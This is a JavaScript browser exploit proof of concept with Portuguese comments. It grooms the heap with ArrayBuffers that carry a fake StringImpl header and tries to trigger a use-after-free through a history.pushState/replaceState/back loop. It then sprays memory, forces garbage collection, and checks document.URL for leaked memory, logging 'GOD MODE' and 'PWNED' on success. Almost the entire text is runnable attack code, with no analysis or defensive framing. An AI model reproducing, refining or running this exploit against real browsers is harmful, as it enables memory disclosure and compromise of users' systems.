<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// === A ÚNICA MUDANÇA ESTÁ AQUI ===
function createFakeObject(size, marker) {
    try {
        let buf = new ArrayBuffer(size);
        let view = new Uint32Array(buf);
        
        // MODIFICAÇÃO MÍNIMA:
        // Se for o bucket de 64 bytes (o vencedor), injeta o cabeçalho falso.
        if (size === 64) {
            // Estrutura Fake StringImpl
            view[0] = 0x00000016; // Flags (String 8-bit)
            view[1] = 0x00010000; // LENGTH: 65536 (Isso causa o vazamento)
            view[2] = 0x41414141; // Ponteiro de dados (Lixo)
            view[3] = 0x41414141; // Ponteiro de dados (Lixo)
            // Preenche o resto com 'C' para manter o peso
            for(let i=4; i<view.length; i++) view[i] = 0x43434343;
        } else {
            // Para os outros (80, 96, 128), mantém o comportamento original
            for(let i=0; i<view.length; i++) view[i] = marker;
        }
        
        return buf;
    } catch(e) { return null; }
}

async function runShotgunExploit() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Preparando...";

    // Mantemos os mesmos buckets que funcionaram
    const BUCKETS = [
        { size: 80,  marker: 0x41414141 }, // AAAA
        { size: 96,  marker: 0x42424242 }, // BBBB
        { size: 64,  marker: 0x43434343 }, // ALVO (Agora com Payload Fake)
        { size: 128, marker: 0x44444444 }  // DDDD
    ];

    log("1. Preparando Grooming (Igual ao teste original)...");
    for(let b of BUCKETS) {
        for(let k=0; k<100; k++) keepAlive.push(createFakeObject(b.size, b.marker));
    }
    
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    // === TRIGGER UAF (Loop 48 Original) ===
    log("2. Disparando UAF (Loop 48)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        if (i === 47) {
            log(">>> SPRAY FINAL <<<");
            
            setTimeout(() => history.back(), 0);
            
            // Spray massivo (Mesma lógica)
            for(let k=0; k<200; k++) {
                for(let b of BUCKETS) {
                    keepAlive.push(createFakeObject(b.size, b.marker));
                }
            }
            
            setTimeout(() => forceGC(), 20); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(400);
    checkResult();
}

function forceGC() {
    for (let i = 0; i < 4; i++) new ArrayBuffer(8 * 1024 * 1024);
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    
    // VERIFICAÇÃO 1: URL GIGANTE (SUCESSO ABSOLUTO)
    // Se a URL tiver mais de 2000 chars e NÃO for só 'V', vazamos memória.
    if (url.length > 2000 && url.indexOf("VVVV") === -1) {
        log("!!! GOD MODE !!! URL Gigante Detectada!");
        log(`Tamanho: ${url.length}`);
        let dump = "";
        for(let i=1000; i<1020; i++) dump += url.charCodeAt(i).toString(16) + " ";
        log(`LEAK: ${dump}`);
        statusEl.innerText = "PWNED: MEMORY LEAK";
        statusEl.className = "pwned";
        return;
    }

    // VERIFICAÇÃO 2: CRASH IMINENTE
    // Se não vazou, mas o marcador 'C' sumiu ou a URL corrompeu, é bom sinal.
    log("Análise Final:");
    log(`Tamanho URL: ${url.length}`);
    
    if (url.indexOf("CCCC") !== -1) {
        log("Resultado: 'CCCC' encontrado.");
        log("Nota: O objeto entrou, mas o navegador leu como texto, não como header.");
    } else {
        log("Resultado: Padrão não encontrado ou 'V' persistente.");
        log("Se o navegador CRASHAR agora, foi SUCESSO de escrita.");
    }
}
